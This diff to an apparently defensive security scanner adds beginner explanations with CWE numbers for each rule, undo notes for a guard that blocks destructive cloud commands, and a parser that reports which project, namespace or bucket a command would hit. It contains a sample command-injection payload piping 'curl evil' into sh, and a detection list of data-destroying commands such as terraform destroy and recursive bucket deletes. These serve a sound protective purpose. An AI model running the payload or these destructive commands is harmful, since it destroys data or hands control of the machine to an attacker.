@@ -807,32 +807,113 @@ export const mask = (line: string) =>
     .replace(/([=:]\s*["']?)([^"'\s,;)]{4,})/g, (_, lead: string, value: string) => `${lead}${value.slice(0, 3)}****`)
     .replace(/\b([A-Za-z0-9_-]{3})[A-Za-z0-9_\-+/]{12,}\b(?!\s*[=:])/g, '$1****')
 
-export const formatFindings = (path: string, findings: readonly Finding[]) =>
+/** The finding's line as it may be shown: secrets masked. */
+export const shown = (f: Pick<Finding, 'id' | 'snippet'>) => (SECRET_RULES.has(f.id) ? mask(f.snippet) : f.snippet)
+
+/**
+ * Why each rule matters, for the learning mode: the weakness (CWE) and what an
+ * attacker does with it, in two sentences a beginner can follow.
+ */
+export const EXPLAIN: Record<string, { cwe: number; why: string }> = {
+  GHA001: { cwe: 829, why: 'A tag like @v4 can be moved to new code at any time; if the action\'s repo is compromised, your pipeline runs the attacker\'s code with your secrets (tj-actions/changed-files, 2025).' },
+  GHA002: { cwe: 829, why: 'pull_request_target runs with write access and secrets; checking out the PR\'s code lets any outside contributor run their code with them ("pwn request").' },
+  GHA003: { cwe: 78, why: 'An issue title is attacker-controlled text; inside run: it becomes part of the shell script, so a title like `a"; curl evil | sh; "` runs on your runner.' },
+  GHA004: { cwe: 250, why: 'Every step, including third-party actions, gets a token that can push code, publish releases and change settings. One compromised step owns the repo.' },
+  GHA005: { cwe: 250, why: 'Without a permissions block the token gets the repository default, often read-write. Least privilege limits what a compromised step can do.' },
+  GHA006: { cwe: 532, why: 'Inline secrets are pasted into the generated script, where they can leak through logs, error messages or the process list.' },
+  DKR001: { cwe: 1104, why: 'latest changes under you: today\'s build and tomorrow\'s are different images, and a compromised upstream tag lands in production unreviewed.' },
+  DKR002: { cwe: 250, why: 'A process running as root inside the container is one kernel or runtime bug away from root on the host.' },
+  DKR003: { cwe: 538, why: 'ENV and ARG values are stored in the image layers; anyone who can pull the image can read them with `docker history`.' },
+  DKR004: { cwe: 494, why: 'ADD silently downloads URLs and unpacks archives, without checksum, which makes it easy to pull in something you did not review.' },
+  DKR005: { cwe: 494, why: 'Piping a download into a shell runs whatever the server sends today, with no check that it is the script you reviewed.' },
+  TF001: { cwe: 284, why: 'Bots scan the whole IPv4 space in minutes; an open SSH, RDP or database port is found and attacked within hours.' },
+  TF002: { cwe: 284, why: 'Public buckets are the most common cloud data leak: anyone with the URL can list and download everything in them.' },
+  TF003: { cwe: 269, why: 'Owner/admin rights let one leaked credential delete or take over the whole project, not just the service that needed access.' },
+  TF004: { cwe: 284, why: 'A database on a public IP is exposed to password guessing and unpatched-server exploits from the entire internet.' },
+  TF005: { cwe: 798, why: 'Terraform files end up in git, plan output and state; a password written there is readable by everyone with repo access, forever, in history.' },
+  TF006: { cwe: 311, why: 'Without encryption, a stolen disk, snapshot or backup exposes the data in plain text, and many compliance regimes forbid it.' },
+  TF007: { cwe: 693, why: 'Without deletion protection, one wrong apply or destroy wipes a stateful resource and its data.' },
+  K8S001: { cwe: 250, why: 'A privileged container can access every device of the node; escaping to the host is trivial.' },
+  K8S002: { cwe: 668, why: 'Sharing the host\'s network, process list or file system lets the pod see and tamper with other workloads on the node.' },
+  K8S003: { cwe: 250, why: 'Running as root or allowing escalation turns any code-execution bug in the app into root inside the container, one step from the node.' },
+  K8S004: { cwe: 1104, why: 'Unpinned images make rollbacks and audits impossible: you cannot tell which code actually ran.' },
+  CMP001: { cwe: 250, why: 'A privileged container can access every device of the host; escaping to the host is trivial.' },
+  CMP002: { cwe: 250, why: 'Access to the Docker socket is root on the host: the container can start a new privileged container that mounts /.' },
+  CMP003: { cwe: 668, why: 'Host namespaces remove the isolation between the container and the machine: it sees host processes and every port.' },
+  CMP004: { cwe: 798, why: 'Compose files are committed and shared; a password written there is readable by everyone with repo access, forever, in history.' },
+  CMP005: { cwe: 1104, why: 'latest changes under you, so two developers and the server run different code with the same compose file.' },
+  NPM001: { cwe: 506, why: 'Install scripts run on every machine that installs the package; this is how most npm supply-chain attacks steal tokens (event-stream, ua-parser-js).' },
+  NPM002: { cwe: 829, why: 'A git or URL dependency skips the registry\'s immutability: the branch or file can change to malicious code without a new version.' },
+  NPM003: { cwe: 1104, why: 'Any-version ranges install whatever was published last, including a hijacked release.' },
+  AGT001: { cwe: 862, why: 'With every shell command pre-approved, a prompt injection in a file, web page or issue can make the agent run anything on your machine without asking you.' },
+  AGT002: { cwe: 693, why: 'These switches turn off the checks between the agent and your machine, or start any MCP server a cloned repository brings, with your credentials.' },
+  AGT003: { cwe: 829, why: 'An unpinned MCP server downloads and runs the newest package on every start, with access to your tokens; one hijacked release is enough.' },
+  AGT004: { cwe: 798, why: 'Agent config is committed and shared; a token written there leaks to everyone with repo access and to every tool that reads the config.' },
+  AGT005: { cwe: 451, why: 'Zero-width characters hide text from human reviewers while the model still reads it: a classic way to smuggle instructions into a prompt.' },
+  AGT006: { cwe: 77, why: 'Instruction files are read as trusted prompts by every session; text that overrides rules or hides actions is prompt injection.' },
+  AGT007: { cwe: 494, why: 'Hooks run automatically on every event with your permissions; a downloaded script can change at any time.' },
+  AGT008: { cwe: 693, why: 'Switching a rule off silences it for everyone in the repo, so the decision deserves a human review.' },
+  SEC001: { cwe: 321, why: 'Anyone with repo access, now or later via history, can use the key; deleting the file does not remove it from git history.' },
+  SEC002: { cwe: 798, why: 'Leaked keys are scraped from public repos within minutes and used for crypto mining, data theft or spam on your bill.' },
+  SEC003: { cwe: 451, why: 'Bidirectional control characters make code display differently than it compiles, so a reviewer approves something other than what runs (CVE-2021-42574).' },
+  SEC004: { cwe: 538, why: 'A .env file usually holds real credentials; if git does not ignore it, the next `git add .` commits them.' },
+}
+
+export const formatFindings = (path: string, findings: readonly Finding[], explain = false) =>
   findings
     .map(f => {
-      const shown = SECRET_RULES.has(f.id) ? mask(f.snippet) : f.snippet
-      return `${ICON[f.severity]} ${f.id} [${f.severity}] ${base(path)}:${f.line}: ${f.title}\n   ${shown}\n   fix: ${f.fix}`
+      const why = explain ? EXPLAIN[f.id] : undefined
+      const lesson = why ? `\n   why: ${why.why} (CWE-${why.cwe}: https://cwe.mitre.org/data/definitions/${why.cwe}.html)` : ''
+      return `${ICON[f.severity]} ${f.id} [${f.severity}] ${base(path)}:${f.line}: ${f.title}\n   ${shown(f)}\n   fix: ${f.fix}${lesson}`
     })
     .join('\n')
 
-// Destructive cloud / cluster commands for the Bash guard.
-const DESTRUCTIVE: readonly [RegExp, string][] = [
-  [/\bterraform\s+(destroy\b|apply\b.*-auto-approve|state\s+rm\b|force-unlock\b)/, 'Terraform change without a reviewed plan'],
-  [/\b(tofu)\s+(destroy\b|apply\b.*-auto-approve)/, 'OpenTofu change without a reviewed plan'],
-  [/\bgcloud\b.*\s(delete|remove-iam-policy-binding)\b/, 'gcloud delete'],
-  [/\bgcloud\b.*add-iam-policy-binding\b.*roles\/(owner|editor)\b/, 'gcloud grants owner/editor'],
-  [/\b(gsutil\s+(-m\s+)?rm\s+.*-r|gcloud\s+storage\s+rm\s+.*(-r|--recursive))/, 'recursive bucket delete'],
-  [/\baws\b.*\s(delete-[\w-]+|terminate-instances|rb|deregister-[\w-]+)\b/, 'aws delete'],
-  [/\baws\s+s3\s+rm\b.*--recursive/, 'recursive S3 delete'],
-  [/\baws\s+iam\s+attach-\w+-policy\b.*AdministratorAccess/, 'aws grants AdministratorAccess'],
-  [/\baz\b.*\s(delete|purge)\b/, 'az delete'],
-  [/\bkubectl\b.*\sdelete\s+(ns|namespace|namespaces|pv|pvc|crd|node|nodes|all)\b|\bkubectl\b.*\sdelete\b.*--all\b/, 'kubectl bulk delete'],
-  [/\bhelm\s+(uninstall|delete)\b/, 'helm uninstall'],
-  [/\bdocker\s+(system|volume)\s+prune\b.*(-a|--all|--volumes|-f)/, 'docker prune of volumes/images'],
+// Destructive cloud / cluster commands for the Bash guard: what it is, and what undoing it takes.
+const DESTRUCTIVE: readonly [RegExp, string, string][] = [
+  [/\bterraform\s+(destroy\b|apply\b.*-auto-approve|state\s+rm\b|force-unlock\b)/, 'Terraform change without a reviewed plan', 'Deleted resources and their data are gone; recreating them gives new IDs and empty disks.'],
+  [/\b(tofu)\s+(destroy\b|apply\b.*-auto-approve)/, 'OpenTofu change without a reviewed plan', 'Deleted resources and their data are gone; recreating them gives new IDs and empty disks.'],
+  [/\bgcloud\b.*\s(delete|remove-iam-policy-binding)\b/, 'gcloud delete', 'Most deletes are final; some resources (projects, secrets) keep a short recovery window.'],
+  [/\bgcloud\b.*add-iam-policy-binding\b.*roles\/(owner|editor)\b/, 'gcloud grants owner/editor', 'Reversible with remove-iam-policy-binding, but the grant is live until then.'],
+  [/\b(gsutil\s+(-m\s+)?rm\s+.*-r|gcloud\s+storage\s+rm\s+.*(-r|--recursive))/, 'recursive bucket delete', 'Objects are gone unless object versioning or soft delete is on for the bucket.'],
+  [/\baws\b.*\s(delete-[\w-]+|terminate-instances|rb|deregister-[\w-]+)\b/, 'aws delete', 'Final for most resources; terminated instances lose their instance store and non-retained volumes.'],
+  [/\baws\s+s3\s+rm\b.*--recursive/, 'recursive S3 delete', 'Objects are gone unless bucket versioning is on.'],
+  [/\baws\s+iam\s+attach-\w+-policy\b.*AdministratorAccess/, 'aws grants AdministratorAccess', 'Reversible with detach-*-policy, but the grant is live until then.'],
+  [/\baz\b.*\s(delete|purge)\b/, 'az delete', 'Final for most resources; purge also skips soft-delete recovery.'],
+  [/\bkubectl\b.*\sdelete\s+(ns|namespace|namespaces|pv|pvc|crd|node|nodes|all)\b|\bkubectl\b.*\sdelete\b.*--all\b/, 'kubectl bulk delete', 'Everything in the namespace goes, PVC data included unless the reclaim policy is Retain.'],
+  [/\bhelm\s+(uninstall|delete)\b/, 'helm uninstall', 'The release and its resources are removed; persistent volumes may go with them.'],
+  [/\bdocker\s+(system|volume)\s+prune\b.*(-a|--all|--volumes|-f)/, 'docker prune of volumes/images', 'Pruned volumes and their data are gone.'],
 ]
 
-export const destructive = (command: string): { reason: string; isProd: boolean } | undefined => {
+export const destructive = (command: string): { reason: string; isProd: boolean; undo: string } | undefined => {
   const hit = DESTRUCTIVE.find(([re]) => re.test(command))
   if (hit === undefined) return undefined
-  return { reason: hit[1], isProd: /\bprod(uction)?\b|-prd\b|_prod\b/i.test(command) }
+  return { reason: hit[1], isProd: /\bprod(uction)?\b|-prd\b|_prod\b/i.test(command), undo: hit[2] }
 }
+
+const SCOPE_FLAGS: readonly [RegExp, string][] = [
+  [/--project[=\s]+(\S+)/, 'project'],
+  [/--(region|zone|location)[=\s]+(\S+)/, 'region'],
+  [/--profile[=\s]+(\S+)/, 'AWS profile'],
+  [/--subscription[=\s]+(\S+)/, 'subscription'],
+  [/(?:--resource-group|\s-g)[=\s]+(\S+)/, 'resource group'],
+  [/--context[=\s]+(\S+)/, 'kube context'],
+  [/(?:--namespace|\s-n)[=\s]+(\S+)/, 'namespace'],
+  [/(?:--name|\s-n)[=\s]+(\S+)/, 'name'],
+  [/-target[=\s]+(\S+)/, 'target'],
+  [/-var-file[=\s]+(\S+)/, 'var file'],
+  [/s3:\/\/(\S+)|gs:\/\/(\S+)/, 'bucket'],
+]
+
+/**
+ * What a destructive command would hit, read from its flags, so the question
+ * to the user names the project, namespace or bucket, not just the verb.
+ */
+export const blastRadius = (command: string): { label: string; value: string }[] =>
+  SCOPE_FLAGS.flatMap(([re, label]) => {
+    // `-n` is the namespace for kubectl and helm, the resource name for az.
+    const isKube = /\b(kubectl|helm)\b/.test(command)
+    if ((label === 'namespace' && !isKube) || (label === 'name' && isKube)) return []
+    const m = re.exec(command)
+    const value = m?.slice(1).filter(Boolean).at(-1)?.replace(/^['"]|['"]$/g, '')
+    return value === undefined ? [] : [{ label, value }]
+  })
